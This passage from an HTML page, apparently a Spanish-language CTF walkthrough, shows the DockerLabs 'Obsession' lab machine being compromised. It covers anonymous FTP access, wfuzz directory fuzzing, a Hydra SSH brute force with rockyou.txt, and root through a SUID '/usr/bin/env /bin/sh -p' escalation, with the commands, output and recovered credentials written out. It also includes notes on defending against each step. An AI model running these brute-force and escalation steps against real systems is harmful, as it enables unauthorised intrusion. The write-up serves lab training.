+        <div><span class="o-green">22/tcp&nbsp;&nbsp;open&nbsp;&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH 9.6p1 Ubuntu 3ubuntu13</span></div>
+        <div><span class="o-cyan">80/tcp&nbsp;&nbsp;open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache httpd 2.4.58 ((Ubuntu))</span></div>
+        <div>|_http-title: Russoski Coaching</div>
+        <div>&nbsp;</div>
+        <div>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML CON XSLTPROC</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el XML generado por Nmap, aplicamos la hoja de estilos XSLT oficial que viene
+          incluida en Kali Linux en <code style="color:var(--cyan)">/usr/share/nmap/nmap.xsl</code>.
+          Esta transformación convierte el XML estructurado en una tabla HTML navegable con
+          información de puertos, servicios, versiones y scripts NSE. El resultado es un archivo
+          <strong>obsession.html</strong> que podemos abrir directamente en el navegador para
+          revisar el reporte de forma visual, ideal para documentar evidencias en un pentest real.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl obsession.xml > obsession.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">obsession.xml</span> &gt; <span class="arg">obsession.html</span></span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ EXPORTAR A HTML?</p>
+        <p>En un pentest profesional, la documentación es tan importante como el ataque. El reporte HTML generado por xsltproc muestra puertos, servicios, versiones y resultados de scripts NSE en una tabla ordenada y filtrable. <strong>Es más legible que el XML crudo</strong> y puede adjuntarse directamente a un informe de auditoría. El comando <code>xsltproc /usr/share/nmap/nmap.xsl scan.xml &gt; reporte.html</code> no requiere instalar nada adicional en Kali — todo ya está disponible.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FTP -->
+    <div class="section" id="ftp">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Enumeración FTP — Acceso Anónimo</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">CONEXIÓN FTP CON USUARIO ANÓNIMO</span>
+      </div>
+      <div class="prose">
+        <p>
+          El escaneo Nmap ya nos alertó: el servidor FTP tiene el <span class="hl">acceso anónimo
+          habilitado</span>. Esto significa que podemos conectarnos sin necesidad de credenciales
+          reales usando el usuario <code style="color:var(--cyan)">anonymous</code> (o simplemente
+          <code style="color:var(--cyan)">ftp</code>) y cualquier string como contraseña
+          (por convención se usa un email vacío o simplemente Enter). Este es un
+          <span class="hl-red">misconfiguration clásico</span> en servidores FTP, ya que permite
+          que cualquier persona en la red acceda a los archivos compartidos sin autenticación.
+        </p>
+        <p>
+          Una vez dentro, Nmap ya nos había listado dos archivos:
+          <span class="hl-cyan">chat-gonza.txt</span> y <span class="hl-cyan">pendientes.txt</span>.
+          Los descargamos ambos con el comando <code style="color:var(--cyan)">get</code> del
+          cliente FTP interactivo para analizarlos en nuestra máquina atacante.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ftp 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FTP</span>
+        <div><span class="prompt">$ </span><span class="cmd">ftp <span class="arg">172.17.0.2</span></span></div>
+        <div><span class="cmd">Name: <span class="arg">anonymous</span></span></div>
+        <div><span class="cmd">Password: <span class="comment">[Enter]</span></span></div>
+        <div><span class="prompt">ftp&gt; </span><span class="cmd">ls</span></div>
+        <div><span class="prompt">ftp&gt; </span><span class="cmd">get chat-gonza.txt</span></div>
+        <div><span class="prompt">ftp&gt; </span><span class="cmd">get pendientes.txt</span></div>
+        <div><span class="prompt">ftp&gt; </span><span class="cmd">bye</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Connected to 172.17.0.2.</div>
+        <div><span class="o-green">230 Login successful.</span></div>
+        <div>&nbsp;</div>
+        <div>-rw-r--r--  1 0  0  667 Jun 18 2024 <span class="o-cyan">chat-gonza.txt</span></div>
+        <div>-rw-r--r--  1 0  0  315 Jun 18 2024 <span class="o-cyan">pendientes.txt</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">226 Transfer complete.</span> <span class="o-yellow">chat-gonza.txt</span></div>
+        <div><span class="o-green">226 Transfer complete.</span> <span class="o-yellow">pendientes.txt</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// MISCONFIGURACIÓN — FTP ANÓNIMO</p>
+        <p>Permitir el acceso FTP anónimo en un servidor de producción es una vulnerabilidad de configuración crítica. Aunque en este CTF los archivos son inofensivos, en un entorno real podría exponer credenciales, backups, código fuente, configuraciones de bases de datos o cualquier archivo que el administrador haya dejado en el servidor FTP sin darse cuenta. <strong>vsftpd</strong> tiene el acceso anónimo deshabilitado por defecto — aquí fue habilitado intencionalmente para el laboratorio.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- WEB -->
+    <div class="section" id="web">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Enumeración Web</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">ANÁLISIS DEL SITIO WEB EN PUERTO 80</span>
+      </div>
+      <div class="prose">
+        <p>
+          Accedemos a <span class="hl-cyan">http://172.17.0.2/</span> y encontramos un sitio web
+          de <strong>"The Aesthetic Dream"</strong>, presentado como el sitio de un entrenador
+          personal llamado <strong>Russoski</strong>. El sitio incluye una descripción del
+          propietario como informático y entrenador personal con certificado de musculación y
+          fitness. En el footer del sitio aparece un email:
+          <span class="hl-cyan">russoski@dockerlabs.es</span> y el texto
+          <em>"Copyright Russoski © 2024"</em>.
+        </p>
+        <p>
+          Esta información ya es <span class="hl">valiosa desde el punto de vista OSINT</span>:
+          el nombre <strong>russoski</strong> aparece tanto en el título del sitio detectado por
+          Nmap (<em>"Russoski Coaching"</em>) como en el email. Es un candidato fuerte para ser
+          nombre de usuario en el sistema. Sin embargo, antes de lanzar fuerza bruta, necesitamos
+          confirmar que el usuario existe, y para eso realizaremos fuzzing de directorios.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FUZZ -->
+    <div class="section" id="fuzz">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Fuzzing de Directorios — wfuzz</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">FUZZING CON WFUZZ</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el puerto 80 abierto, la siguiente fase es <span class="hl">enumerar directorios
+          y archivos ocultos</span> del servidor web. Para ello usamos <strong>wfuzz</strong>,
+          una herramienta de fuzzing web que reemplaza la palabra clave <code style="color:var(--cyan)">FUZZ</code>
+          en la URL con cada línea de un diccionario, analiza las respuestas HTTP y filtra según
+          los códigos de estado.
+        </p>
+        <p>
+          La flag <span class="hl-cyan">--hc=404</span> (hide code) oculta todas las respuestas
+          con código 404 (Not Found), que son la mayoría — nos interesa solo lo que
+          <em>existe</em>. Con <span class="hl-cyan">-t 200</span> lanzamos 200 hilos en paralelo
+          para maximizar la velocidad. Usamos el diccionario
+          <code style="color:var(--cyan)">directory-list-2.3-medium.txt</code> de DirBuster,
+          que contiene ~220.000 palabras comunes de directorios web.
+        </p>
+        <p>
+          El resultado muestra tres hallazgos relevantes con código HTTP 301 (redirect) o 200:
+          <span class="hl">/backup</span>, <span class="hl">/important</span> y
+          <span class="hl">/server-status</span> (Apache status page).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://172.17.0.2/FUZZ">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WFUZZ</span>
+        <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">--hc=404</span> <span class="flag">-t 200</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="arg">http://172.17.0.2/FUZZ</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>* Wfuzz 3.1.0 - The Web Fuzzer *</div>
+        <div>&nbsp;</div>
+        <div>Target: http://172.17.0.2/FUZZ</div>
+        <div>Total requests: 220560</div>
+        <div>&nbsp;</div>
+        <div>ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response&nbsp;&nbsp;Lines&nbsp;&nbsp;Word&nbsp;&nbsp;Chars&nbsp;&nbsp;Payload</div>
+        <div>───────────────────────────────────────────────────────</div>
+        <div><span class="o-green">000001105</span>&nbsp;&nbsp;301&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9 L&nbsp;&nbsp;&nbsp;&nbsp;28 W&nbsp;&nbsp;312 Ch&nbsp;&nbsp;"<span class="o-green">important</span>"</div>
+        <div><span class="o-green">000002348</span>&nbsp;&nbsp;301&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9 L&nbsp;&nbsp;&nbsp;&nbsp;28 W&nbsp;&nbsp;275 Ch&nbsp;&nbsp;"<span class="o-green">backup</span>"</div>
+        <div><span class="o-cyan">000095524</span>&nbsp;&nbsp;403&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9 L&nbsp;&nbsp;&nbsp;&nbsp;28 W&nbsp;&nbsp;275 Ch&nbsp;&nbsp;"server-status"</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">EXPLORACIÓN DE /backup — USUARIO ENCONTRADO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Accedemos a <span class="hl-cyan">http://172.17.0.2/backup/</span> y encontramos un
+          <strong>directory listing</strong> (el servidor lista el contenido del directorio
+          porque no tiene un <code style="color:var(--cyan)">index.html</code> y la opción
+          <em>Options Indexes</em> de Apache está activa). Dentro hay un archivo:
+          <span class="hl">backup.txt</span> (2024-06-25, 61 bytes).
+        </p>
+        <p>
+          Al acceder a <span class="hl-cyan">http://172.17.0.2/backup/backup.txt</span>
+          encontramos un mensaje que el administrador dejó descuidadamente:
+          <span class="hl">"Usuario para todos mis servicios: russoski (cambiar pronto!)"</span>.
+          Esto es <span class="hl-red">OSINT en texto plano</span>: el administrador confirmó
+          explícitamente que usa <strong>russoski</strong> como nombre de usuario en todos sus
+          servicios — incluyendo SSH.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">http://172.17.0.2/backup/backup.txt</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">Usuario para todos mis servicios: russoski (cambiar pronto!)</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">EXPLORACIÓN DE /important — MANIFIESTO HACKER</span>
+      </div>
+      <div class="prose">
+        <p>
+          Accedemos también a <span class="hl-cyan">http://172.17.0.2/important/</span>, que
+          contiene otro directory listing con el archivo <strong>important.md</strong>
+          (2024-06-17, 2.4K). Su contenido resulta ser el famoso
+          <strong>"Manifiesto Hacker — La Conciencia de un Hacker"</strong>, un texto icónico
+          de la cultura hacker escrito por The Mentor en 1986. Si bien no contiene información
+          operacional para el ataque, es parte de la ambientación temática de la máquina.
+          En un pentest real, cualquier archivo expuesto debe ser revisado — podría contener
+          credenciales, rutas del sistema o información de configuración.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DIRECTORY LISTING — VULNERABILIDAD WEB</p>
+        <p>El <strong>Directory Listing</strong> (o Directory Traversal) ocurre cuando Apache tiene configurado <code>Options Indexes</code> y no existe un archivo <code>index.html/php</code> en el directorio. Esto expone la estructura de archivos al visitante. En producción debe deshabilitarse añadiendo <code>Options -Indexes</code> en la configuración de Apache o en el archivo <code>.htaccess</code>.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- HYDRA -->
+    <div class="section" id="hydra">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Fuerza Bruta SSH — Hydra</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">ATAQUE DE DICCIONARIO CON HYDRA SOBRE SSH</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el usuario <span class="hl">russoski</span> confirmado, procedemos a realizar
+          un <span class="hl">ataque de fuerza bruta por diccionario</span> sobre el servicio
+          SSH del puerto 22. Usamos <strong>Hydra</strong>, la herramienta de fuerza bruta
+          de red más utilizada en pentesting, con el diccionario
+          <span class="hl-cyan">rockyou.txt</span> — una wordlist de aproximadamente
+          <strong>14.3 millones de contraseñas</strong> reales filtradas de la brecha de datos
+          de RockYou en 2009. Es el diccionario estándar para ataques de contraseñas en CTFs
+          porque cubre la gran mayoría de contraseñas débiles y comunes.
+        </p>
+        <p>
+          La flag <span class="hl-cyan">-f</span> indica a Hydra que se detenga al encontrar
+          la primera credencial válida, evitando continuar el ataque innecesariamente.
+          <span class="hl-cyan">-T 20</span> lanza 20 tareas paralelas para acelerar el proceso.
+          <span class="hl-cyan">-V</span> muestra cada intento en pantalla (verbose), útil
+          para ver el progreso en tiempo real.
+        </p>
+        <p>
+          Hydra encuentra la contraseña en el intento <strong>#121</strong>:
+          <span class="hl">iloveme</span>. La contraseña es simple y predecible, lo que demuestra
+          por qué las contraseñas cortas o basadas en palabras comunes son vulnerables a ataques
+          de diccionario incluso sin GPUs.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="hydra -l russoski -P /home/kali/Desktop/diccionarios/rockyou.txt -f ssh://172.17.0.2 -t 20 -V">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HYDRA</span>
+        <div><span class="prompt">$ </span><span class="cmd">hydra <span class="flag">-l</span> <span class="arg">russoski</span> <span class="flag">-P</span> <span class="arg">/home/kali/Desktop/diccionarios/rockyou.txt</span> <span class="flag">-f</span> <span class="arg">ssh://172.17.0.2</span> <span class="flag">-t 20</span> <span class="flag">-V</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "alexander" - 116 of 14344401</div>
+        <div>[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "destiny" - 117 of 14344401</div>
+        <div>[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "christian" - 118 of 14344401</div>
+        <div>[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "sayang" - 120 of 14344401</div>
+        <div>[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "america" - 121 of 14344401</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme</span></div>
+        <div><span class="o-green">[STATUS] attack finished for 172.17.0.2 (valid pair found)</span></div>
+        <div>1 of 1 target successfully completed, 1 valid password found</div>
+        <div>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-29 17:32:51</div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">russoski</div></div>
+        <div class="cred-item"><div class="cred-label">CONTRASEÑA</div><div class="cred-val">iloveme</div></div>
+        <div class="cred-item"><div class="cred-label">SERVICIO</div><div class="cred-val" style="color:var(--cyan)">SSH — puerto 22</div></div>
+        <div class="cred-item"><div class="cred-label">FUENTE</div><div class="cred-val" style="color:var(--cyan)">rockyou.txt</div></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// DEFENSA CONTRA BRUTE FORCE SSH</p>
+        <p>Para proteger SSH contra ataques de fuerza bruta existen varias medidas: <strong>(1) fail2ban</strong> — bloquea IPs tras N intentos fallidos. <strong>(2) Autenticación por clave pública</strong> — elimina completamente el uso de contraseñas. <strong>(3) Cambiar el puerto SSH</strong> de 22 a uno no estándar. <strong>(4) AllowUsers</strong> en sshd_config para restringir qué usuarios pueden conectarse. <strong>(5) Contraseñas fuertes de 16+ caracteres</strong> con caracteres especiales hacen que los ataques de diccionario sean inviables en tiempo práctico.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ACCESO SSH -->
+    <div class="section" id="acceso">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Acceso Inicial — SSH</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">PROBLEMA DE HOST KEY — REMOTE HOST IDENTIFICATION HAS CHANGED</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al intentar conectarnos por SSH, recibimos una advertencia de seguridad:
+          <span class="hl-red">WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!</span>
+          Este error ocurre porque el cliente SSH recuerda la huella digital (fingerprint)
+          de la clave pública del servidor SSH de la IP <strong>172.17.0.2</strong> de una
+          sesión anterior (probablemente de una máquina DockerLabs diferente que usó la misma IP).
+          El nuevo contenedor Docker tiene una clave SSH diferente, y el cliente SSH lo detecta
+          como una potencial amenaza de tipo <span class="hl-red">Man-in-the-Middle (MitM)</span>.
+        </p>
+        <p>
+          En un entorno real esta advertencia debería tomarse en serio. En nuestro caso sabemos
+          que la IP simplemente fue reutilizada por un contenedor diferente, por lo que la
+          solución es eliminar la entrada antigua del archivo
+          <code style="color:var(--cyan)">~/.ssh/known_hosts</code> con el comando
+          <span class="hl-cyan">ssh-keygen -R</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh russoski@172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH — PRIMER INTENTO</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">russoski@172.17.0.2</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span></div>
+        <div><span class="o-red">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!    @</span></div>
+        <div><span class="o-red">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span></div>
+        <div>IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</div>
+        <div>Someone could be eavesdropping on you right now (man-in-the-middle attack)!</div>
+        <div>Offending ECDSA key in /home/kali/.ssh/known_hosts:17</div>
+        <div>  remove with: ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'</div>
+        <div><span class="o-red">Host key verification failed.</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">SOLUCIÓN — ELIMINAR ENTRADA ANTIGUA DE KNOWN_HOSTS</span>
+      </div>
+      <div class="prose">
+        <p>
+          El propio mensaje de error nos indica el comando exacto para solucionar el problema.
+          <span class="hl-cyan">ssh-keygen -R</span> busca y elimina todas las líneas del archivo
+          <code style="color:var(--cyan)">known_hosts</code> que correspondan a la IP
+          <strong>172.17.0.2</strong> (en este caso, las líneas 15, 16 y 17). Una vez eliminadas,
+          SSH ya no tendrá conflicto con la nueva clave del servidor y nos permitirá conectarnos
+          aceptando la nueva huella digital.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh-keygen -R 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH-KEYGEN</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh-keygen <span class="flag">-R</span> <span class="arg">172.17.0.2</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div># Host 172.17.0.2 found: line 15</div>
+        <div># Host 172.17.0.2 found: line 16</div>
+        <div># Host 172.17.0.2 found: line 17</div>
+        <div><span class="o-green">/home/kali/.ssh/known_hosts updated.</span></div>
+        <div>Original contents retained as /home/kali/.ssh/known_hosts.old</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">CONEXIÓN SSH EXITOSA COMO RUSSOSKI</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el conocido_hosts limpio, volvemos a conectarnos. El cliente SSH nos pide
+          confirmar la nueva huella digital del servidor — respondemos <strong>yes</strong> para
+          guardarla en known_hosts. Ingresamos la contraseña <span class="hl">iloveme</span>
+          y obtenemos acceso al sistema como el usuario <strong>russoski</strong>.
+          El banner muestra <strong>Ubuntu 24.04 LTS (GNU/Linux 6.18.12+kali-amd64 x86_64)</strong>,
+          confirmando el SO objetivo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh russoski@172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH — ACCESO EXITOSO</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">russoski@172.17.0.2</span></span></div>
+        <div><span class="cmd">Are you sure you want to continue connecting (yes/no)? <span class="arg">yes</span></span></div>
+        <div><span class="cmd">russoski@172.17.0.2's password: <span class="arg">iloveme</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.18.12+kali-amd64 x86_64)</span></div>
+        <div>&nbsp;</div>
+        <div>* Documentation: https://help.ubuntu.com</div>
+        <div>* Management:    https://landscape.canonical.com</div>
+        <div>&nbsp;</div>
+        <div>Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1</div>
+        <div><span class="o-cyan">russoski@5396f9ec75cc:~$</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Escalada de Privilegios</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">ENUMERACIÓN DE PERMISOS SUDO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Una vez dentro del sistema, la primera acción en post-explotación es siempre enumerar
+          los vectores de escalada de privilegios disponibles. Comenzamos con
+          <span class="hl-cyan">sudo -l</span>, que lista los comandos que el usuario actual
+          puede ejecutar con privilegios de otro usuario (por defecto root) mediante
+          <code style="color:var(--cyan)">sudo</code>.
+        </p>
+        <p>
+          El resultado revela que russoski puede ejecutar como <strong>root</strong> el binario
+          <span class="hl-cyan">/usr/bin/vim</span> sin necesidad de contraseña
+          (<strong>NOPASSWD</strong>). Vim es un editor de texto que, cuando se ejecuta con
+          sudo, puede ser abusado para spawnear una shell root desde dentro del editor.
+          Sin embargo, antes de explotar eso, verificamos también los binarios SUID.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SUDO</span>
+        <div><span class="prompt">russoski@5396f9ec75cc:~$ </span><span class="cmd">sudo -l</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Matching Defaults entries for russoski on 5396f9ec75cc:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;env_reset, mail_badpass, secure_path=...</div>
+        <div>&nbsp;</div>
+        <div>User russoski may run the following commands on 5396f9ec75cc:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="o-yellow">(root) NOPASSWD: /usr/bin/vim</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">BÚSQUEDA DE BINARIOS SUID</span>
+      </div>
+      <div class="prose">
+        <p>
+          Complementamos la enumeración buscando binarios con el bit <strong>SUID</strong>
+          activado. Los binarios SUID (Set User ID) se ejecutan con los permisos del
+          propietario del archivo — si el propietario es <strong>root</strong> y el binario
+          tiene SUID, cualquier usuario que lo ejecute obtendrá efectivamente privilegios de
+          root durante esa ejecución. El comando <span class="hl-cyan">find / -perm -4000</span>
+          busca en todo el sistema de archivos binarios con el bit 4000 (SUID) activo.
+          La redirección <code style="color:var(--cyan)">2&gt;/dev/null</code> descarta los
+          errores de "Permission denied" que aparecen al intentar leer directorios
+          restringidos.
+        </p>
+        <p>
+          Entre los resultados encontramos <span class="hl">/usr/bin/env</span>, que
+          según GTFOBins es explotable para escalar privilegios cuando tiene el bit
+          SUID activo. Elegimos este vector por ser el más limpio y directo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FIND SUID</span>
+        <div><span class="prompt">russoski@5396f9ec75cc:~$ </span><span class="cmd">find / <span class="flag">-perm -4000</span> <span class="arg">2&gt;/dev/null</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div>
+        <div>/usr/lib/openssh/ssh-keysign</div>
+        <div>/usr/bin/su</div>
+        <div>/usr/bin/chfn</div>
+        <div>/usr/bin/newgrp</div>
+        <div>/usr/bin/mount</div>
+        <div>/usr/bin/umount</div>
+        <div>/usr/bin/passwd</div>
+        <div>/usr/bin/gpasswd</div>
+        <div><span class="o-red">/usr/bin/env</span></div>
+        <div>/usr/bin/chsh</div>
+        <div>/usr/bin/sudo</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ /usr/bin/env CON SUID ES PELIGROSO?</p>
+        <p><strong>env</strong> es un binario que ejecuta un comando en un entorno modificado. Normalmente es inofensivo. Pero cuando tiene el bit SUID activo y su propietario es root, al ejecutar <code>env /bin/sh -p</code>, el proceso hijo (<code>/bin/sh</code>) hereda el <strong>eUID=0 (root)</strong> del proceso padre. La flag <code>-p</code> de <code>/bin/sh</code> evita que la shell descarte el privilegio efectivo, dejándonos con una shell completa como root. GTFOBins documenta este y otros cientos de binarios abusables: <strong>gtfobins.github.io/gtfobins/env/</strong></p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ROOT -->
+    <div class="section" id="root">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Root &amp; Easter Egg</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">EXPLOTACIÓN SUID — OBTENEMOS ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el payload de GTFOBins para <code style="color:var(--cyan)">env</code> con
+          SUID. El comando invoca <span class="hl-cyan">/bin/sh</span> con la flag
+          <span class="hl-cyan">-p</span>, que preserva el <em>effective UID</em> heredado del
+          binario SUID (eUID=0). La shell resultante corre como <span class="hl-red">root</span>,
+          confirmado con <code style="color:var(--cyan)">whoami</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/usr/bin/env /bin/sh -p">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC → ROOT</span>
+        <div><span class="prompt">russoski@5396f9ec75cc:~$ </span><span class="cmd">/usr/bin/env /bin/sh <span class="flag">-p</span></span></div>
+        <div><span class="prompt"># </span><span class="cmd">whoami</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red" style="font-size:1rem;font-weight:bold;">root</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">EXPLORACIÓN POST-ROOT — EASTER EGG</span>
+      </div>
+      <div class="prose">
+        <p>
+          Una vez como root, exploramos el sistema para ver qué encontramos. En el directorio
+          <code style="color:var(--cyan)">/home</code> hay dos usuarios:
+          <strong>russoski</strong> y <strong>ubuntu</strong>. Navegando al directorio
+          <span class="hl-cyan">/root</span> (accesible solo como root), encontramos un
+          archivo llamado <span class="hl">Video-Nagore-Fernandez.txt</span>.
+        </p>
+        <p>
+          Su contenido es el <span class="hl">easter egg</span> de la máquina: un mensaje del
+          creador (<em>"Al fin lo terminé! es tan hermosa.. &lt;3"</em>) acompañado de un
+          enlace a un video de YouTube. En los comentarios del video, el propio creador
+          (<strong>@russo.trickz</strong>) confirma: <em>"Yo creo que es la mejor flag que te
+          puedes encontrar en un CTF hahahah, felicidades por completar la máquina brother!"</em>
+          — una recompensa simpática para quienes exploran más allá de obtener root.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ls /home&#10;cd /root&#10;ls&#10;cat Video-Nagore-Fernandez.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">POST-ROOT</span>
+        <div><span class="prompt"># </span><span class="cmd">ls /home</span></div>
+        <div><span class="cmd">russoski&nbsp;&nbsp;ubuntu</span></div>
+        <div><span class="prompt"># </span><span class="cmd">cd /root && ls</span></div>
+        <div><span class="o-cyan">Video-Nagore-Fernandez.txt</span></div>
+        <div><span class="prompt"># </span><span class="cmd">cat Video-Nagore-Fernandez.txt</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">Al fin lo terminé! es tan hermosa.. &lt;3</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-cyan">https://www.youtube.com/shorts/_v8GzGReTAk</span></div>
+      </div>
+
+      <div style="border: 1px solid var(--green); background: rgba(0,255,136,0.04); padding: 2rem; margin-top: 2rem; text-align: center;">
+        <div style="font-family: var(--font-disp); font-size: 1.8rem; color: var(--green); letter-spacing: 4px; text-shadow: 0 0 20px rgba(0,255,136,0.5);">✓ PWNED</div>
